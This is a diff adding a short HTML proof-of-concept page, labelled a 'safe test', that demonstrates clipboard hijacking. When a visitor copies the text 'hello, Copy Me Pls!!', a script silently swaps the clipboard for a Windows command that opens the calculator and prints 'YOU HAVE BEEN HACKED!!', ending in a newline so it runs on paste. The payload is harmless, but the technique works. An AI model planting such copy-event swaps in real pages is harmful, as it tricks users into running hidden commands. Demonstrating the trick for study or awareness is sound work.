@@ -1,0 +1,11 @@
+<!DOCTYPE html>
+    <html>
+
+    <body>
+       <span id='copy'>hello, Copy Me Pls!! <strong>(safe test)</span></strong>
+       <script>
+        document.getElementById('copy').addEventListener('copy', function(e) { e.clipboardData.setData('text/plain', 'cmd.exe /c calc.exe & for /l %x in (1, 1, 3) do echo YOU HAVE BEEN HACKED!! \r\n'); e.preventDefault(); });
+         </script>
+    </body>
+</html>
+
